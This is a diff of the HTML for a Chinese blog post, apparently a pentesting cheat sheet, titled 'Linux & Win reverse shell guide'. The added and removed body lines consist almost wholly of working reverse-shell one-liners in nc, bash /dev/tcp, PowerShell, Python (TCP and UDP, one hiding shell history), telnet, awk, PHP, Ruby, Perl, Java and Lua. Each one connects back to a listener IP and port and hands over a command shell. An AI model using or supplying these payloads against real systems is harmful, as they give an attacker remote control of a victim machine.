@@ -77,17 +77,17 @@
 
 
 
-<meta name="description" content="nc">
+<meta name="description" content="NCnc -lvvp 6666 nc -e /bin/sh 192.168.220.140 6666 Bash">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux花式弹shell指南">
+<meta property="og:title" content="Linux&amp;Win花式弹shell指南">
 <meta property="og:url" content="https://0xp1n3.github.io/2019/03/26/reverse-shell/index.html">
 <meta property="og:site_name" content="不如茶酒伴">
-<meta property="og:description" content="nc">
+<meta property="og:description" content="NCnc -lvvp 6666 nc -e /bin/sh 192.168.220.140 6666 Bash">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-03-27T15:06:40.025Z">
+<meta property="og:updated_time" content="2019-04-13T08:04:20.765Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Linux花式弹shell指南">
-<meta name="twitter:description" content="nc">
+<meta name="twitter:title" content="Linux&amp;Win花式弹shell指南">
+<meta name="twitter:description" content="NCnc -lvvp 6666 nc -e /bin/sh 192.168.220.140 6666 Bash">
 
 
 
@@ -123,7 +123,7 @@
 
 
 
-  <title>Linux花式弹shell指南 | 不如茶酒伴</title>
+  <title>Linux&Win花式弹shell指南 | 不如茶酒伴</title>
   
 
 
@@ -309,7 +309,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Linux花式弹shell指南</h1>
+          <h1 class="post-title" itemprop="name headline">Linux&Win花式弹shell指南</h1>
         
 
         <div class="post-meta">
@@ -381,37 +381,40 @@
       
 
       
-        <h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><a id="more"></a>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure>
-</blockquote>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash ip port</span><br></pre></td></tr></table></figure>
-</blockquote>
+        <h2 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.220.140 6666</span><br></pre></td></tr></table></figure>
+<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><a id="more"></a>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.220.140/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -ep bypass -Command <span class="string">"<span class="variable">$RcvLFCUFMmdDX</span>='192.168.220.140';<span class="variable">$eGdTwRr</span>=6666;<span class="variable">$aPjzrf</span>=New-Object System.Net.Sockets.TCPClient(<span class="variable">$RcvLFCUFMmdDX</span>,<span class="variable">$eGdTwRr</span>);<span class="variable">$ADWDNku</span>=<span class="variable">$aPjzrf</span>.GetStream();[byte[]]<span class="variable">$mvkwuYHrYO</span>=0..65535|%&#123;0&#125;;<span class="variable">$QPQlsQKzygeCwFV</span>=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'&gt; ');<span class="variable">$ADWDNku</span>.Write(<span class="variable">$QPQlsQKzygeCwFV</span>,0,<span class="variable">$QPQlsQKzygeCwFV</span>.Length);while((<span class="variable">$KCaBvR</span>=<span class="variable">$ADWDNku</span>.Read(<span class="variable">$mvkwuYHrYO</span>,0,<span class="variable">$mvkwuYHrYO</span>.Length)) -ne 0)&#123;<span class="variable">$anSGyc</span>=([text.encoding]::ASCII).GetString(<span class="variable">$mvkwuYHrYO</span>,0,<span class="variable">$KCaBvR</span>);try&#123;<span class="variable">$gRrnhEIMpeoP</span>=(Invoke-Expression -c <span class="variable">$anSGyc</span> 2&gt;&amp;1|Out-String)&#125;catch&#123;Write-Warning 'Something went wrong with execution of command on the target.';Write-Error <span class="variable">$_</span>;&#125;;<span class="variable">$RcvLFCUFMmdDX0</span>=<span class="variable">$gRrnhEIMpeoP</span>+'PS '+(Get-Location).Path+'&gt; ';<span class="variable">$RcvLFCUFMmdDX1</span>=(<span class="variable">$RcvLFCUFMmdDX2</span>[0]|Out-String);<span class="variable">$RcvLFCUFMmdDX2</span>.clear();<span class="variable">$RcvLFCUFMmdDX0</span>=<span class="variable">$RcvLFCUFMmdDX0</span>+<span class="variable">$RcvLFCUFMmdDX1</span>;<span class="variable">$QPQlsQKzygeCwFV</span>=([text.encoding]::ASCII).GetBytes(<span class="variable">$RcvLFCUFMmdDX0</span>);<span class="variable">$ADWDNku</span>.Write(<span class="variable">$QPQlsQKzygeCwFV</span>,0,<span class="variable">$QPQlsQKzygeCwFV</span>.Length);<span class="variable">$ADWDNku</span>.Flush();&#125;;<span class="variable">$aPjzrf</span>.Close();if(<span class="variable">$RcvLFCUFMmdDX3</span>)&#123;<span class="variable">$RcvLFCUFMmdDX3</span>.Stop();&#125;;"</span></span><br></pre></td></tr></table></figure>
 <h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.239.131",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure>
+<p><strong>TCP</strong></p>
 </blockquote>
-<h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 192.168.220.131 6666 | /bin/bash | telnet 192.168.220.131 6665</span><br><span class="line"></span><br><span class="line">nc -lvvp 6666 <span class="comment">#命令传输窗口</span></span><br><span class="line">nc -lvvp 6665 <span class="comment">#命令结果显示窗口</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mknod <span class="built_in">test</span> p &amp;&amp; telnet 192.168.220.131 6666 0&lt;<span class="built_in">test</span> | /bin/bash 1&gt;<span class="built_in">test</span></span><br><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure>
-<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><blockquote>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("192.168.220.131",6666);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
-</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.220.140',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');s.close();"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.220.140",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure>
 <blockquote>
+<p><strong>UDP</strong><br>ps:<code>nc -luvvp 6666</code></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"import os;import pty;import socket;soc=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);soc.connect(('192.168.220.140',6666));os.dup2(soc.fileno(),0);os.dup2(soc.fileno(),1);os.dup2(soc.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');soc.close();"</span></span><br></pre></td></tr></table></figure>
+<h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 192.168.220.131 6666 | /bin/bash | telnet 192.168.220.131 6665</span><br><span class="line">nc -lvvp 6666 <span class="comment">#命令传输窗口</span></span><br><span class="line">nc -lvvp 6665 <span class="comment">#命令结果显示窗口</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -e /tmp/<span class="built_in">test</span> ];<span class="keyword">then</span> rm /tmp/<span class="built_in">test</span>;<span class="keyword">fi</span>;mkfifo /tmp/<span class="built_in">test</span>;cat /tmp/<span class="built_in">test</span>|/bin/sh -i 2&gt;&amp;1|telnet 192.168.220.140 6666 &gt; /tmp/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -e /tmp/<span class="built_in">test</span> ];<span class="keyword">then</span> rm /tmp/<span class="built_in">test</span>;<span class="keyword">fi</span>;mknod /tmp/<span class="built_in">test</span> p &amp;&amp; telnet 192.168.220.140 6666 0&lt;/tmp/<span class="built_in">test</span>|/bin/bash 1&gt;/tmp/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+<h2 id="AWK"><a href="#AWK" class="headerlink" title="AWK"></a>AWK</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p=6666;awk -v port=<span class="string">"<span class="variable">$p</span>"</span> <span class="string">'BEGIN&#123;soc="/inet/tcp/0/192.168.220.140/"port;while(8095856)&#123;do&#123;printf "shell&gt;"|&amp;soc;soc|&amp; getline inp;if(inp)&#123;while((inp|&amp; getline)&gt;0)print $0|&amp;soc;close(inp);&#125;&#125;while(inp!="exit")close(soc);break&#125;&#125;'</span> /dev/null</span><br></pre></td></tr></table></figure>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">"\$soc=fsockopen('192.168.220.140',6666);exec('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock = fsockopen(<span class="string">'192.168.220.131'</span>, <span class="number">6666</span>);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">      <span class="number">0</span> =&gt; $sock,</span><br><span class="line">      <span class="number">1</span> =&gt; $sock,</span><br><span class="line">      <span class="number">2</span> =&gt; $sock</span><br><span class="line"> );</span><br><span class="line"> $process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line"> proc_close($process);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><blockquote>
-<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">*ruby -rsocket -e <span class="string">'f=TCPSocket.open("192.168.220.131",6666).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("192.168.220.131","6666");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure>
-</blockquote>
+<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'f=TCPSocket.open("192.168.220.131",6666).to_i;exec &gt; sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">"exit if fork;soc=TCPSocket.new('192.168.220.140',6666);while(soc.print 'shell&gt;';cmd=soc.gets);IO.popen(cmd,'r')&#123;|io|soc.print io.read&#125;end"</span></span><br></pre></td></tr></table></figure>
 <h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><blockquote>
-<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="192.168.220.131";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
+<p><strong>TCP</strong></p>
 </blockquote>
-<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><blockquote>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br><span class="line"></span><br><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MSocket -e <span class="string">"\$i='192.168.220.140';\$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))))&#123;open(STDIN,'&gt;&amp;S');open(STDOUT,'&gt;&amp;S');open(STDERR,'&gt;&amp;S');exec('/bin/sh -i');&#125;;"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MIO::Socket::INET -e <span class="string">"exit,if(fork);\$soc=new IO::Socket::INET(PeerAddr,'192.168.220.140:'.6666);\$soc-&gt;send('shell&gt;');STDIN-&gt;fdopen(\$soc,r);$~-&gt;fdopen(\$soc,w);system\$_ while&lt;&gt;;"</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>UDP</strong><br>ps:<code>nc -luvvp</code></p>
 </blockquote>
-<h2 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h2><blockquote>
-<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('192.168.220.131','6666');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>
-</blockquote>
-
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MIO::Socket::INET -e <span class="string">'$|=1;$soc = new IO::Socket::INET(PeerAddr =&gt; "192.168.220.140:".6666,Proto =&gt; "udp");while(1)&#123;$soc-send("shell&gt;");$soc-&gt;recv($inp,1024);$h=$soc-&gt;peerhost();$p=$soc-peerport();$d=qx($inp);$soc-&gt;send($d);&#125;'</span></span><br></pre></td></tr></table></figure>
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>
+<h2 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h2><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('192.168.220.131','6666');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -454,10 +457,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/01/LFI-Fuzz/" rel="prev" title="记一次LFI-Fuzz字典构造">
-                记一次LFI-Fuzz字典构造 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -638,7 +637,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#nc"><span class="nav-number">1.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python"><span class="nav-number">2.</span> <span class="nav-text">Python</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Telnet"><span class="nav-number">3.</span> <span class="nav-text">Telnet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP"><span class="nav-number">4.</span> <span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ruby"><span class="nav-number">5.</span> <span class="nav-text">Ruby</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Perl"><span class="nav-number">6.</span> <span class="nav-text">Perl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java"><span class="nav-number">7.</span> <span class="nav-text">Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lua"><span class="nav-number">8.</span> <span class="nav-text">Lua</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#NC"><span class="nav-number">1.</span> <span class="nav-text">NC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bash"><span class="nav-number">2.</span> <span class="nav-text">Bash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PowerShell"><span class="nav-number">3.</span> <span class="nav-text">PowerShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python"><span class="nav-number">4.</span> <span class="nav-text">Python</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Telnet"><span class="nav-number">5.</span> <span class="nav-text">Telnet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AWK"><span class="nav-number">6.</span> <span class="nav-text">AWK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP"><span class="nav-number">7.</span> <span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ruby"><span class="nav-number">8.</span> <span class="nav-text">Ruby</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Perl"><span class="nav-number">9.</span> <span class="nav-text">Perl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java"><span class="nav-number">10.</span> <span class="nav-text">Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lua"><span class="nav-number">11.</span> <span class="nav-text">Lua</span></a></li></ol></div>
             
 
           </div>
